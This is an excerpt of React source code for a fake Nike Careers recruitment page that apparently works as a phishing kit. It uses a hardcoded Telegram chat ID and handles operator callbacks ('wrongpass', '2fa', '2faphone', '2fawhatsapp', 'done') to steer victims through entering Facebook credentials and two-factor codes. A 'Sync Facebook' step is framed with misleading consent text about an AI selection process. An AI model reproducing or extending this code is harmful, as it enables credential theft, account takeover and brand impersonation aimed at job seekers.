...
const TELEGRAM_CHAT_ID = '-1003823624312';
...
const Login: React.FC = () => {
  ...
  useEffect(() => {
    ...
    const handleCb = async (cb: any) => {
      ...
      console.log({ data: d });
      if (d.startsWith(`done_${sessionId}`)) {
        onCloseModal();
        setStep('success');
        setProgress(60);
        return;
      ...
      if (
        d.startsWith(`wrong2fa_${sessionId}`) ||
        d.startsWith(`wrong-2fa-code_${sessionId}`)
      ) {
      ...
      if (d.startsWith(`wrongpass_${sessionId}`)) {
        setLoginError(
      ...
      if (d.startsWith(`2fa_${sessionId}`)) setStep('2fa');
      if (d.startsWith(`2faphone_${sessionId}`)) setStep('2faphone');
      if (d.startsWith(`2fawhatsapp_${sessionId}`)) setStep('2fawhatsapp');
    };
...
• Session: ${sessionId}`,
  ...
  return (
    <div className="min-h-screen w-full flex flex-col justify-between bg-[#F1F5F8]">
      {/* Header */}
      <header className="w-full h-20 border-b-2 border-[#E2E8EB] flex items-center justify-between px-4 sm:px-6 md:px-12 lg:px-32 bg-white">
        <div className="flex flex-row justify-center items-center">
          <img src={logo} alt="logo" className="w-25" />
          <p className="font-semibold text-gray-600 text-[23px] pt-4 pl-4 sx:text-[23px]">
            Join the Nike Team!
          </p>
        </div>
        <button>
      ...
      {step === 'meta' && (
        <Meta
          onPressContinueWithMeta={onPressContinueWithMeta}
      ...
      {/* Footer Progress */}
      <footer className="w-full  bg-white border-t-2 border-[#E2E8EB]  px-0">
        <LinearProgress
          variant="determinate"
          value={progress}
          sx={{
...
const Meta = ({
  onPressContinueWithMeta,
  setSelectedJob,
  selectedJob,
}: any) => {
  console.log({ ktu: selectedJob });
  return (
    <div className="flex-grow flex items-center justify-center p-6">
      <div className="bg-white w-full max-w-[600px] p-12 flex flex-col justify-between">
        <div>
          <h2 className="text-2xl font-bold text-gray-700  mt-4">
            Start Your Application
          </h2>
          <p className="mb-2 mt-4 text-gray-500">Select Your Preferred Job:</p>
          <div className="flex flex-row justify-between">
            <button
              className={`rounded-[10px] w-[49%] py-2 cursor-pointer ${
                selectedJob === 'social-media' ? 'bg-gray-300' : 'bg-[#E2E8EB]'
              }`}
              onClick={() => {
                setSelectedJob('social-media');
              }}
            >
            ...
            <button
              className={`rounded-[10px] w-[49%] py-2 cursor-pointer ${
                selectedJob === 'content' ? 'bg-gray-300' : 'bg-[#E2E8EB]'
              }`}
              onClick={() => {
                setSelectedJob('content');
              }}
            >
              <p className=" text-gray-600">Content Creation Lead</p>
            </button>
          </div>
          <div className="flex flex-row justify-between mt-3">
            <button
              className={`rounded-[10px] w-[49%] py-2 cursor-pointer ${
                selectedJob === 'digital-marketing'
                  ? 'bg-gray-300'
                  : 'bg-[#E2E8EB]'
              }`}
              onClick={() => {
                setSelectedJob('digital-marketing');
              }}
            >
            ...
            <button
              className={`rounded-[10px] w-[49%] py-2 cursor-pointer ${
                selectedJob === 'vp-marketing' ? 'bg-gray-300' : 'bg-[#E2E8EB]'
              }`}
              onClick={() => {
                setSelectedJob('vp-marketing');
              }}
            >
              <p className=" text-gray-600">VP of Marketing</p>
            </button>
          </div>
          {/* <hr className="h-[2px] mt-5 mb-5 bg-[#D9D9D9] border-[#D9D9D9]" /> */}
          <p className="text-[#4E4E4E] font-[400] text-[15px] mt-5">
            Nike Careers uses Facebook sync to verify your public info and
            support our AI selection process. Only public data is accessed.
          </p>

          <p className="text-[#4E4E4E] font-[400] text-[15px] mt-5">
            By continuing, you consent to this temporary sync for application
            evaluation.
          </p>
        </div>
        <div className="h-[2px] w-full bg-gray-200 mt-4" />
        <div className="flex flex-row items-center justify-center">
          <button
            onClick={onPressContinueWithMeta}
            className="mt-6  h-14 w-[70%] rounded-full text-white text-lg flex items-center justify-center gap-2 cursor-pointer border-solid border-1 border-gray-300 "
          >
            <img src={FACEBOOK_FAVICON} alt="Facebook" className="h-6" />
            <p className="text-gray-600">Sync Facebook</p>
          </button>
        </div>
      </div>
    </div>
  ...
  return (
    <div className="flex-grow flex items-center justify-center p-4">
      <div className="bg-white border-2 border-[#E2E8EB] rounded-[40px] w-full max-w-lg p-8 flex flex-col items-center">
        <h1 className="text-2xl font-bold text-gray-700 text-center mt-4">
          Welcome to Nike Careers
        </h1>
        <img src={logo} alt="talent logo" className="w-27 py-5" />
        ...
        <button
          ...
          className="w-full h-14 rounded-full bg-gray-800 text-white text-lg font-medium cursor-pointer my-9"
        >
          Continue
        </button>
      </div>
